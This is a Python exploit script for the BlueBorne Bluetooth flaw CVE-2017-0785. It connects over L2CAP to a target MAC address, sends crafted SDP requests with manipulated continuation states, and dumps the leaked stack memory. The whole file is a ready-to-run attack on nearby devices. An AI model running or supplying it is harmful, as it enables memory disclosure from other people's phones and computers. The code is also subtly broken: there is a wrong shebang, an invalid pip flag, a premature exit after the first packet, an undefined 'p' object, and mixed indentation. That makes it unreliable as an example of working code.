#!/usr/share/python3

#####################################################################################################
#
#	CVE-2017-0785-BlueBorne
#
# apt-get update
# apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential
# pip install --update pip
# pip install --update pwntools
#
# git clone https://github.com/Gallopsled/pwntools
# pip install --update --editable ./pwntools
#
#####################################################################################################

from pwn import *
import bluetooth
import sys
import time


# Check for args
if (len(sys.argv) != 2) or (not ':' in sys.argv[1]) or (len(sys.argv[1]) != len('XX:XX:XX:XX:XX:XX')):
    print ('Usage: ' + sys.argv[0] + ' XX:XX:XX:XX:XX:XX')
    exit(1)


# Function that confirgure the Packet for send
def packet(service, continuation_state):
    pkt = '\x02\x00\x00'
    pkt += p16(7 + len(continuation_state))
    #print('PACKET------------------------------------------------------')
    #print('\tContinuation State: \n' + hexdump(p16(7 + len(continuation_state))))
    pkt += '\x35\x03\x19'
    pkt += p16(service)
    #print('\tService: ' + p16(service))
    pkt += '\x01\x00'
    pkt += continuation_state
    return pkt
	
	
# --
target = sys.argv[1]			# target MAC address
service_long = 0x0100			# L2CAP channel (Logical Link Control and Adaptation Protocol)
service_short = 0x0001			# SDP channel
mtu = 50						# maximum transmission unit
n = 40							# number of packets
context.endian = 'big'			# byte order: big-endian


# Creating progress log 
print('[*] Starting BlueBorne Exploit...')
print('[*] Creating L2CAP socket')

# Start socket L2CAP
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, mtu)

print('[*] Connecting to target')

try:
	sock.connect((target, 1))
except Exception:
	try:
	  	print('[!] ERROR: Unable to reach device ' + target)
	except Exception:
	  	print('Exiting...')
		exit(1)

print('    [+] Connected successfully')
print('[*] Trying to trigger vulnerability...')
try:
	sock.send(packet(service_long, '\x00'))
	hexdump(packet(service_long, '\x00'))
	exit(1)
except Exception:
	try:
	  	print('[!] ERROR: Unable to send packets.')
	except Exception:
	  	print('Exiting...')
		exit(1)

#print('\nFULL PACKET: ' + packet(service_long, '\x00') + '\n')
data = sock.recv(mtu)
#print('DATA: ' + data)

#sock.close()
#exit(1)	

if data[-3] != '\x02':
    try:
        print('[!] ERROR: Invalid continuation state received.')
    except Exception:
  	print('Exiting...')
        exit(1)

stack = ''

for i in range(1, n):
    p.status('Sending packet %d' % i)
    sock.send(packet(service_short, data[-3:]))
    print ('PACKET WITH DATA: -->' + packet(service_short, data[-3:]))
    print ('DATA FROM PACKET: -->\n' + hexdump(data[-3:]))	
    data = sock.recv(mtu)
    stack += data[9:-3]

print('    [+] Stealing Stack information...')

sock.close()

print(hexdump(stack))
print('')
print('[+] Exploit completed successfully.')
